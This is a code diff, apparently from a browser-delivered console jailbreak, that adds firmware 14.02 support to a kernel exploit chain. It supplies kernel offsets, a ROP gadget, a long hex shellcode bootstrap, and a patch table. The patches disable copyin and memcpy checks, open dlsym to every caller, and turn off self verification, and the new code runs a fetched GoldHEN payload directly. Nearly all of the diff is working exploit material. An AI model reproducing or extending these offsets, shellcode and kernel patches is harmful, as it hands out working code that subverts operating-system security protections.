@@ -64,6 +64,14 @@ const FIRMWARE = {
     padding:   0x0b39ad8,
     ghKmem:    0x0466290,
   },
+  "14.02": {
+    anchor:    0xE6C30,   /* the lock the leak hands us */
+    swap_rbp:  0xa81478,   /* xchg rbp,rax ; ret */
+    prison0:   0x111fa18,   /* holds a pointer to prison0, so read it */
+    rootvnode: 0x2136e90,
+    padding:   0xB3A298,   /* start of the zero run behind kernel text */
+    ghKmem:    0x466920,
+  },
 };
 
 let K = null;
@@ -118,6 +126,8 @@ const BOOTSTRAP_TABLE = {
     + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
     + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
     + "20c0480d000001000f22c031c0c3",
+  "14.02":
+    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981637c1b00b8eb04000041b9eb00000041baeb000000668981bcce2f0041bbeb000000b890e9ffff4881c21ba17c006689b1737c1b006689b9937c1b0066448981048b6200c681cd0a0000ebc6819dda2b00ebc681e1da2b00ebc6815ddb2b00ebc681a1db2b00ebc6814ddd2b00ebc681fde12b00ebc681cde22b00eb66448989ef936200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68136233900eb66898124771b00c781d87c1b0090e93c01c78190e73b004831c0c3c681daae1f0037c681ddae1f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3",
   "13.52":
       "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
     + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
@@ -162,6 +172,23 @@ const PATCH_TABLE = {
   [0x01b7ab8, "90e93c01", "dlsym, open it to every caller"],
   [0x0628684, "eb00",     "self verification"],
   [0x0628f6f, "eb00",     "delayed panic on suspend"],
+  ],
+  "14.02": [
+  [0x0000acd,"eb",       "bcopy"],
+  [0x2BDA9D, "eb",       "bzero"],
+  [0x2BDAE1, "eb",       "pagezero"],
+  [0x2BDB5D, "eb",       "memcpy"],
+  [0x2BDBA1, "eb",       "pagecopy"],
+  [0x2BDD4D, "eb",       "copyin"],
+  [0x2BE1FD, "eb",       "copyinstr"],
+  [0x2BE2CD, "eb",       "copystr"],
+  [0x1B7C63, "eb04",     "dlsym, first check"],
+  [0x1B7C73, "eb04",     "dlsym, second check"],
+  [0x1B7C93, "90e9",     "dlsym, nop and jump"],
+  [0x1B7724, "90e9",     "load_prx"],
+  [0x1B7CD8, "90e93c01", "dlsym, open it to every caller"],
+  [0x628B04, "eb00",     "self verification"],
+  [0x6293EF, "eb00",     "delayed panic on suspend"],
   ],
   "13.52": [
   [0x0000acd, "eb",       "bcopy"],
@@ -897,6 +924,12 @@ async function runPatchSet(room) {
 async function loadEnabler(url, k, kbase, room) {
   const blob = await fetchBytes(url, "e");
   if (blob === null) return false;
+  if (FW_KEY === "14.02") {
+    /* WebKitty's 14.02 bootstrap applies the initial kernel patches, then
+       starts the current raw GoldHEN payload directly. There is no separate
+       1402 patchset in that path. loadPayload checks the raw format. */
+    return loadPayload(url, blob);
+  }
   if (blob.length === GH.nlOff + GH.nlLen) {
     say("[e] " + blob.length + " bytes -- composite image, patch chain path");
     return loadGoldhen(url, k, kbase, room, blob);
